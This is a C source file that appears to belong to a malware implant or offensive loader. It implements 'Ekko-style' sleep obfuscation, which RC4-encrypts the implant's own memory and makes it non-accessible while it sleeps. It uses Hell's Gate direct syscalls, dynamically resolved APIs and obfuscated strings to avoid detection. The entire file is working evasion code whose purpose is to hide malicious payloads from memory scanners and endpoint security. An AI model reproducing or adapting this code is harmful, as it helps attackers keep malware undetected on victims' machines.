/*
 * Ekko-style Sleep Obfuscation
 * All API calls via g_Api (dynamic resolution) + syscalls for VirtualProtect.
 */

#include "sleep_obf.h"
#include "hellsgate.h"
#include "winapi.h"
#include "obfstr.h"

#if ENABLE_SLEEP_OBFUSCATION

typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING, *PUSTRING;

typedef NTSTATUS (WINAPI *fnSystemFunction032)(PUSTRING data, PUSTRING key);

extern SYSCALL_TABLE g_Syscalls;

static PVOID  g_BaseAddr   = NULL;
static SIZE_T g_RegionSize = 0;
static BYTE   g_SleepKey[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
                                0x13, 0x37, 0x42, 0x69, 0xAB, 0xCD, 0xEF, 0x01 };

static NTSTATUS SyscallProtect(PVOID addr, SIZE_T size, ULONG new_prot, PULONG old_prot) {
    PVOID  base = addr;
    SIZE_T region = size;
    SetSyscallEntry(g_Syscalls.NtProtectVirtualMemory.dwSSN,
        g_Syscalls.NtProtectVirtualMemory.pSyscallAddr);
    return DoSyscall((HANDLE)-1, &base, &region, new_prot, old_prot);
}

BOOL SleepObfuscateInit(PVOID base_addr, SIZE_T region_size) {
    g_BaseAddr = base_addr;
    g_RegionSize = region_size;
    return TRUE;
}

void ObfuscatedSleep(DWORD milliseconds) {
    if (!g_BaseAddr || !g_RegionSize) {
        g_Api.pSleep(milliseconds);
        return;
    }

    char s_adv[OBF_ADVAPI32_LEN];
    deobf(s_adv, OBF_ADVAPI32, OBF_ADVAPI32_LEN);
    HMODULE hAdvapi = g_Api.pLoadLibraryA(s_adv);
    SecureZeroMemory(s_adv, sizeof(s_adv));
    if (!hAdvapi) { g_Api.pSleep(milliseconds); return; }

    char s_sf[OBF_SF032_LEN];
    deobf(s_sf, OBF_SF032, OBF_SF032_LEN);
    fnSystemFunction032 pSF032 =
        (fnSystemFunction032)g_Api.pGetProcAddress(hAdvapi, s_sf);
    SecureZeroMemory(s_sf, sizeof(s_sf));
    if (!pSF032) { g_Api.pSleep(milliseconds); return; }

    USTRING data_str = { (DWORD)g_RegionSize, (DWORD)g_RegionSize, g_BaseAddr };
    USTRING key_str  = { sizeof(g_SleepKey), sizeof(g_SleepKey), g_SleepKey };

    ULONG old_protect;

    SyscallProtect(g_BaseAddr, g_RegionSize, PAGE_READWRITE, &old_protect);
    pSF032(&data_str, &key_str);
    SyscallProtect(g_BaseAddr, g_RegionSize, PAGE_NOACCESS, &old_protect);

    HANDLE hEvent = g_Api.pCreateEventA(NULL, FALSE, FALSE, NULL);
    if (hEvent) {
        g_Api.pWaitForSingleObjectEx(hEvent, milliseconds, TRUE);
        g_Api.pCloseHandle(hEvent);
    } else {
        g_Api.pSleep(milliseconds);
    }

    SyscallProtect(g_BaseAddr, g_RegionSize, PAGE_READWRITE, &old_protect);
    pSF032(&data_str, &key_str);
    SyscallProtect(g_BaseAddr, g_RegionSize, PAGE_EXECUTE_READ, &old_protect);
}

#else
BOOL SleepObfuscateInit(PVOID base_addr, SIZE_T region_size) {
    (void)base_addr; (void)region_size;
    return TRUE;
}
void ObfuscatedSleep(DWORD milliseconds) { Sleep(milliseconds); }
#endif
